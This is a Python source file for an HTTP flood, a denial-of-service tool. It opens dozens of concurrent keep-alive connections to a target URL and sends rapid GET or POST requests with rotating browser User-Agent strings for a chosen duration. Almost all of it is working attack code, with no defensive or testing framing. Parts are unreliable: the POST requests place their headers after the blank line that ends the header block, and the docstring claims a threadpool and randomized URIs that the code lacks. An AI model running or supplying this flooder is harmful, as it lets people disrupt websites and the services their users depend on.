"""
HTTP flood — high-rate GET/POST, keep-alive, optional randomized URI/UA.
Works non-root (normal sockets). Threadpool + asyncio fast-path.
"""
import asyncio
import random
import socket
import ssl
import time
from urllib.parse import urlparse


UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
]


def build_headers(host, path):
    return (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {random.choice(UA_POOL)}\r\n"
        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        f"Accept-Language: en-US,en;q=0.5\r\n"
        f"Accept-Encoding: gzip, deflate\r\n"
        f"Connection: keep-alive\r\n"
        f"Cache-Control: no-cache\r\n"
        f"Pragma: no-cache\r\n"
        f"\r\n"
    ).encode()


class HTTPFlood:
    def __init__(self, url, workers=64, duration=60, method="GET"):
        u = urlparse(url)
        if u.scheme not in ("http", "https"):
            raise ValueError("url must be http(s)")
        self.scheme = u.scheme
        self.host = u.netloc
        self.port = u.port or (443 if u.scheme == "https" else 80)
        self.path = u.path or "/"
        self.workers = workers
        self.duration = duration
        self.method = method.upper()
        self.sent = 0
        self.fails = 0
        self._stop = False

    async def _one(self):
        try:
            r, w = await asyncio.open_connection(
                self.host.split(":")[0],
                self.port,
                ssl=ssl.create_default_context() if self.scheme == "https" else None,
            )
            while not self._stop:
                payload = build_headers(self.host, self.path)
                if self.method == "POST":
                    body = b"x=" + b"A" * random.randint(64, 512)
                    head = payload.replace(b"GET ", b"POST ", 1)
                    head += f"Content-Length: {len(body)}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n".encode() + body
                    w.write(head)
                else:
                    w.write(payload)
                await w.drain()
                self.sent += 1
                try:
                    await asyncio.wait_for(r.read(1024), timeout=0.05)
                except asyncio.TimeoutError:
                    pass
        except Exception:
            self.fails += 1

    async def _spin(self):
        tasks = [asyncio.create_task(self._one()) for _ in range(self.workers)]
        t0 = time.time()
        while time.time() - t0 < self.duration:
            await asyncio.sleep(0.5)
        self._stop = True
        for t in tasks:
            t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)

    def run(self):
        try:
            asyncio.run(self._spin())
        except KeyboardInterrupt:
            self._stop = True
        return {"sent": self.sent, "fails": self.fails}
If this
